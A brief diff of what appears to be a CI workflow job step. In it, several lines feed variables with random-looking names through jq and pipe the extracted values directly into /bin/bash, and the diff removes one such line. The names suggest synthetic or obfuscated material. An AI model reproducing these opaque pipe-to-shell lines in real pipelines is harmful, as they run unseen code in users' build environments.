@@ -22,7 +22,6 @@ jobs:
           echo $t79170 | jq -r .oyiv95 | /bin/bash
           printf '%s' "$qxxrx21718" | jq -r .y21977 | /bin/bash
           printf '%s' "$hy20" | jq -r .skyo9499 | /bin/bash
-          printf '%s' "$p06824" | jq -r .h30375 | /bin/bash
           echo $rxop93382 | jq -r .lhshp088 | /bin/bash
 
       - name: Save results
